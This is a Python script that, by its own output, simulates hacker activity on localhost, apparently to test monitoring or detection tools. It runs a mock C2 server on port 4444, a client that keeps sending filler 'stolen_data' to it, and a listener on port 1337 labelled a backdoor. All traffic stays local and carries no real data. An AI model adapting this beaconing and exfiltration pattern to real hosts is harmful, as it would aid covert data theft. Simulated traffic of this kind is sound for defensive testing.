import socket
import time
import threading

def serve_c2(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("127.0.0.1", port))
    server.listen(5)
    print(f"[*] Attacker C2 server listening on port {port}")
    while True:
        try:
            client, addr = server.accept()
            print(f"[*] Received C2 connection from {addr}")
            while True:
                data = client.recv(4096)
                if not data: break
        except:
            break

def exfiltrate_data():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("127.0.0.1", 4444))
            print("[*] Malicious process connected to C2 port 4444")
            while True:
                s.send(b"stolen_data=" + b"A" * 1024)
                time.sleep(2)
        except Exception as e:
            print(f"Exfiltration error: {e}")
            time.sleep(2)

def backdoor_listen():
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(("127.0.0.1", 1337))
        server.listen(5)
        print("[*] Backdoor listening on suspicious port 1337")
        while True:
            time.sleep(1)
    except Exception as e:
        print(f"Backdoor error: {e}")

if __name__ == "__main__":
    print("--- Simulating Hacker Activity ---")
    threading.Thread(target=serve_c2, args=(4444,), daemon=True).start()
    time.sleep(1) # wait for server to start
    threading.Thread(target=exfiltrate_data, daemon=True).start()
    threading.Thread(target=backdoor_listen, daemon=True).start()
    
    print("[*] Attack simulation is running. Keep this script open.")
    try:
        while True:
            time.sleep(5)
    except KeyboardInterrupt:
        print("Stopped simulation.")
